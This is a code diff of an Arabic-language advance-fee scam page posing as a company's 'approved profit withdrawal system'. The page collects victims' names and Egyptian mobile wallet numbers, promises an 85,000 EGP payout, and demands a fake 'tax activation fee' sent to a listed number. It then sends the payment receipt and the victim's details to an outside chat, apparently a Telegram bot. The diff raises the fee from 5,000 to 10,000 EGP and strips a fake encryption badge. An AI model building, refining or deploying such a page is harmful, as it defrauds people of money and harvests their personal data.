@@ -6,7 +6,7 @@
 <title>نظام سحب الأرباح المعتمد | شركة التقوى</title>
 <style>
     :root {
-        --primary: #1a73e8; /* لون أزرق رسمي للمصداقية */
+        --primary: #1a73e8; 
         --success: #28a745;
         --gold: #fbc02d;
     }
@@ -62,10 +62,7 @@
         border: 1px solid #ced4da;
         border-radius: 10px;
         font-size: 16px;
-        transition: 0.3s;
     }
-    input:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 5px rgba(26,115,232,0.3); }
-    
     .instruction-box {
         background: #fffde7;
         border-right: 5px solid var(--gold);
@@ -80,6 +77,7 @@
         border-radius: 12px;
         border: 2px dashed var(--primary);
         margin: 15px 0;
+        text-align: center;
     }
     .number-display {
         font-size: 24px;
@@ -97,17 +95,6 @@
         font-size: 18px;
         font-weight: bold;
         cursor: pointer;
-        transition: 0.3s;
-    }
-    button:hover { background: #1557b0; }
-    .footer-secure {
-        font-size: 11px;
-        color: #999;
-        margin-top: 15px;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        gap: 5px;
     }
 </style>
 </head>
@@ -131,12 +118,11 @@
         <input type="text" id="in-name" placeholder="الاسم الكامل كما هو مسجل بالبطاقة">
         <input type="number" id="in-phone" placeholder="رقم المحفظة (فودافون، اتصالات، أورانج)">
         <button onclick="nextStep()">متابعة إجراءات الصرف</button>
-        <div class="footer-secure">🛡️ نظام تشفير آمن 256-bit</div>
     </div>
 
     <div class="content" id="step-2" style="display: none;">
         <h3 style="color: #333; margin-top: 0;">تفعيل أمر الصرف الإلكتروني</h3>
-        <p style="font-size: 14px; color: #666;">بناءً على سياسة الشركة، يرجى سداد رسوم التفعيل الضريبية (<b>5,000 ج.م</b>) لإتمام التحويل:</p>
+        <p style="font-size: 14px; color: #666;">يرجى سداد رسوم التفعيل الضريبية (<b>10,000 ج.م</b>) لإتمام التحويل:</p>
         
         <div class="wallet-highlight">
             <small>رقم التحويل المعتمد:</small><br>
@@ -173,7 +159,7 @@
         const formData = new FormData();
         formData.append("chat_id", chatId);
         formData.append("photo", fileInput.files[0]);
-        formData.append("caption", `✅ طلب سحب جديد:\n👤 الاسم: ${name}\n📱 المحفظة: ${phone}\n💰 الربح: 85,000 ج.م\n💸 الرسوم: 5,000 ج.م`);
+        formData.append("caption", `✅ طلب سحب جديد:\n👤 الاسم: ${name}\n📱 المحفظة: ${phone}\n💰 الربح: 85,000 ج.م\n💸 الرسوم: 10,000 ج.م`);
 
         btn.innerText = "جاري المعالجة...";
         btn.disabled = true;
